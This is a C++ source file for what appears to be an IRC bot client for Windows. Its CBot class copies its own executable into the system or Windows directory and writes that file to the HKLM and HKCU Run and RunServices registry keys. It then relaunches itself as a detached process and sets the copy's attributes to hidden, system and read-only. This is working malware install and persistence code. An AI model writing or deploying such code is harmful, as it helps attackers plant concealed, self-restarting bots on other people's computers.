#include <stdio.h>
#include "../Inc/CBot.h"

CBot::CBot ()
{
	Init();
}

CBot::~CBot()
{
	delete IRC;
	delete Mac;
	delete Crypt;
	
	delete [] MyPath;
	delete [] DestPath;
	delete [] DestFile;
}

void CBot::Init()
{
	IRC = new CIRC();
	Mac = new CMac();
	Crypt = new CCrypt();
	Crypt->SetSKey(key);
	
	MyPath = new char[MAX_PATH];
	DestPath = new char[MAX_PATH];
	DestFile = new char[MAX_PATH];

	GetModuleFileName(NULL, MyPath, MAX_PATH);
#ifdef COPY_TO_SYSDIR
	GetSystemDirectory(DestPath, MAX_PATH);
#else
	GetWindowsDirectory(DestPath, MAX_PATH);
#endif
}

void CBot::MsgBx(HWND hWnd, UINT Type, char *title, char *msg, ...)
{
	va_list va;
	char buf[1024];

	va_start(va, msg);
	vsprintf(buf, msg, va);
	va_end(va);

	MessageBox(hWnd, buf, title, Type);
}

void AddRegRun(const char *v, const unsigned char *f)
{
	HKEY key;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegSetValueEx(key, v, 0, REG_SZ, f, strlen((const char *)f));
	RegCloseKey(key);
	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegSetValueEx(key, v, 0, REG_SZ, f, strlen((const char *)f));
	RegCloseKey(key);
}

void AddRegRunService(const char *v, const unsigned char *f)
{
	HKEY key;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegSetValueEx(key, v, 0, REG_SZ, f, strlen((const char *)f));
	RegCloseKey(key);
	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegSetValueEx(key, v, 0, REG_SZ, f, strlen((const char *)f));
	RegCloseKey(key);
}

void CBot::SetDest(char *file)
{
	lstrcpy(DestFile, file);
	strcat(DestPath, "\\");
	strcat(DestPath, DestFile);
	if (strcmp(DestPath, MyPath) == 0)
		return;

	WIN32_FIND_DATA finddata;
	HANDLE handle = FindFirstFile(DestFile,&finddata);
	if (handle != INVALID_HANDLE_VALUE)
	{
		SetFileAttributes((LPCSTR)DestFile,FILE_ATTRIBUTE_NORMAL);
		remove(DestFile);
	}
	while(CopyFile(MyPath, DestPath, FALSE) == FALSE)
		Sleep(2000);
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(STARTUPINFO));
	sinfo.cb = sizeof(sinfo);
	sinfo.wShowWindow = SW_HIDE;
	AddRegRun((const char *)regkey, (const unsigned char *)file);
	AddRegRunService((const char *)regkey, (const unsigned char *)file);
	CreateProcess(NULL, DestPath, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	SetFileAttributes((LPCSTR)DestPath,FILE_ATTRIBUTE_NORMAL);
	SetFileAttributes((LPCSTR)DestPath,FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY);
	exit(0);
}
